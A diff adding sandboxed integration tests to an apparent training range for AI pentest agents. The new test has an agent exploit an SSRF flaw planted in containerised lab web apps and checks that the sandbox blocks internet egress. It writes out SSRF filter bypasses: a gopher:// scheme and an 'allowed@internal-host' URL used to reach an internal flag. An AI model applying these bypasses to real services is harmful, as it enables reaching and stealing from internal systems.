@@ -18,10 +18,12 @@ import tempfile
 from collections.abc import Mapping
 from pathlib import Path
 from typing import Any
+from urllib.parse import urlencode
 
 import pytest
-from cyber_webapp import WebappPack
+from cyber_webapp import NetworkedContainerWebappRuntime, WebappPack
 from cyber_webapp.realize_admit import cmdi_exploit_and_benign
+from graphschema import WorldGraph
 from openrange_pack_sdk import Backing, Snapshot
 from openrange_trl import EpisodeEnv, SandboxError
 
@@ -35,6 +37,18 @@ _CMDI_MANIFEST = {
     "seed": 7,
     "loot_shapes": {"file": 1, "db": 0},
     "vuln_kinds": {"command_injection": 1},
+}
+
+# An SSRF on a public endpoint pivoting to an internal service -> _is_networked is True,
+# so this world realizes as the NetworkedContainerWebappRuntime (public + internal
+# containers on one net) rather than a single container. seed 3 matches the proven
+# networked tests (tests/test_cyber_networked.py).
+_SSRF_MANIFEST = {
+    "pack": {"id": "webapp"},
+    "runtime": {"tick": {"mode": "off"}},
+    "npc": [],
+    "seed": 3,
+    "vuln_kinds": {"ssrf": 1},
 }
 
 
@@ -67,9 +81,48 @@ def _admit_cmdi() -> Snapshot:
     return snap
 
 
+def _admit_ssrf() -> Snapshot:
+    snap = admit(WebappPack(), manifest=_SSRF_MANIFEST, max_repairs=3)
+    assert isinstance(snap, Snapshot), snap
+    return snap
+
+
 def _pentest_task_id(snapshot: Snapshot) -> str:
     task = next(t for t in snapshot.tasks if t.meta.get("family") == "webapp.pentest")
     return task.id
+
+
+def _ssrf_exploit(graph: WorldGraph) -> tuple[str, str, str]:
+    """The (public path, query param, payload URL) for the world's networked SSRF.
+
+    Built from the sampled filter the same way the proven networked tests do, so the
+    agent's own curl drives the cross-service pivot to the internal flag.
+    """
+    ssrf = next(
+        n for n in graph.by_kind("vulnerability") if n.attrs.get("kind") == "ssrf"
+    )
+    params = dict(ssrf.attrs.get("params", {}))
+    affected = {e.dst for e in graph.out_edges(ssrf.id, "affects")}
+    public_eps = {
+        e.dst
+        for svc in graph.by_kind("service")
+        if svc.attrs.get("exposure") == "public"
+        for e in graph.out_edges(svc.id, "exposes")
+    }
+    ep_id = next(iter(affected & public_eps))
+    path = str(graph.nodes[ep_id].attrs.get("path", "/"))
+    param = str(params["target_param"])
+    host = str(params["internal_host"])
+    internal_path = str(params["internal_path"])
+    ssrf_filter = params.get("ssrf_filter")
+    if ssrf_filter == "scheme_block":
+        payload = f"gopher://{host}{internal_path}"
+    elif ssrf_filter == "host_allowlist":
+        allowed = str(params.get("allowed_host", "ok"))
+        payload = f"http://{allowed}@{host}{internal_path}"
+    else:  # pragma: no cover - generation only emits the two service-name filters
+        raise AssertionError(f"unexpected networked ssrf_filter: {ssrf_filter!r}")
+    return path, param, payload
 
 
 def test_a_sandboxed_http_world_needs_a_container(tmp_path: Path) -> None:
@@ -142,6 +195,29 @@ def _bind_mount_writeback_works() -> bool:
         shutil.rmtree(probe, ignore_errors=True)
 
 
+def _openrange_resources(kind: str) -> set[str]:
+    # Names of all openrange-* docker networks (or -a containers), for a leak check: a
+    # clean teardown leaves none of an episode's own behind.
+    args = (
+        ["network", "ls", "--format", "{{.Name}}"]
+        if kind == "network"
+        else ["ps", "-a", "--format", "{{.Names}}"]
+    )
+    out = subprocess.run(["docker", *args], capture_output=True, text=True, timeout=10)
+    return {n for n in out.stdout.split() if n.startswith("openrange-")}
+
+
+def _network_is_internal(name: str) -> bool:
+    out = subprocess.run(
+        ["docker", "network", "inspect", "--format", "{{.Internal}}", name],
+        capture_output=True,
+        text=True,
+        timeout=10,
+        check=False,
+    )
+    return out.returncode == 0 and out.stdout.strip() == "true"
+
+
 @gated
 def test_byo_shell_tool_exploits_a_real_episode_in_its_sandbox(tmp_path: Path) -> None:
     # End to end through the real harness: a real CONTAINER cyber world. The agent, in
@@ -203,6 +279,75 @@ def test_the_sandbox_can_reach_the_target_but_not_the_host_or_internet(
         env._finalize()
     finally:
         service.close()
+
+
+@gated
+def test_byo_shell_tool_pivots_an_ssrf_networked_world_in_its_sandbox(
+    tmp_path: Path,
+) -> None:
+    # The multi-service analogue of the cmdi case: an SSRF world routes to the
+    # NetworkedContainerWebappRuntime (a public + an internal container on the world's
+    # own net). With sandbox=True the public container is DOUBLE-attached — its world
+    # net (so its SSRF handler still pivots to the internal flag) AND a second,
+    # per-episode agent net (so the sandbox reaches it by the `target` alias). The agent
+    # drives the whole cross-service pivot from its sandbox with its own curl, and the
+    # real grader returns full reward — the untested double-attach, proven end to end.
+    snap = _admit_ssrf()
+    graph = snap.graph
+    assert isinstance(
+        WebappPack().realize(graph, Backing.CONTAINER), NetworkedContainerWebappRuntime
+    )  # ssrf on a public endpoint -> _is_networked -> the networked backing
+    flag = str(graph.nodes["secret_flag"].attrs["value_ref"])
+    path, param, payload = _ssrf_exploit(graph)
+
+    before_nets = _openrange_resources("network")
+    before_cons = _openrange_resources("container")
+
+    service = EpisodeService(WebappPack(), tmp_path / "svc", backing=Backing.CONTAINER)
+    env = EpisodeEnv(
+        service=service,
+        snapshots={snap.snapshot_id: snap},
+        tools=[shell, submit],
+        sandbox=True,
+    )
+    agent_net: str | None = None
+    target: str | None = None
+    try:
+        obs = env.reset(snapshot_id=snap.snapshot_id, task_id=_pentest_task_id(snap))
+        assert "http://target:" in obs  # the brief points at the in-network alias
+        agent_net, target = env._network, env._target_container
+        assert agent_net is not None and target is not None
+
+        # The per-episode agent net is --internal: the agent reaches the target by alias
+        # but has no route to the host or internet (the world-net pivot is unaffected).
+        assert _network_is_internal(agent_net)
+        reachable = env.shell(
+            "curl -s -o /dev/null -w '%{http_code}' http://target:8000/"
+        )
+        assert "200" in reachable, reachable  # public service reachable by the alias
+        egress = env.shell("curl --max-time 5 -s http://1.1.1.1; echo EXIT=$?")
+        assert "EXIT=0" not in egress, egress
+
+        # The SSRF pivot: the agent's curl hits the public service, which fetches the
+        # flag from the internal service across the world net and echoes it back — over
+        # the double-attached container, from the sandbox, no shipped tool.
+        url = f"http://target:8000{path}?{urlencode({param: payload})}"
+        out = env.shell(f"curl -s '{url}'")
+        assert flag in out, out  # recovered across the container boundary
+        assert env.submit(flag) == "submitted"
+
+        env._finalize()
+        assert env.reward == 1.0
+        assert env.report is not None and env.report.passed
+    finally:
+        service.close()
+
+    # Teardown leaks nothing: the agent net + the double-attached target are gone, and
+    # no openrange-* network/container this episode created survives.
+    assert agent_net not in _openrange_resources("network")
+    assert target not in _openrange_resources("container")
+    assert _openrange_resources("network") <= before_nets
+    assert _openrange_resources("container") <= before_cons
 
 
 @gated
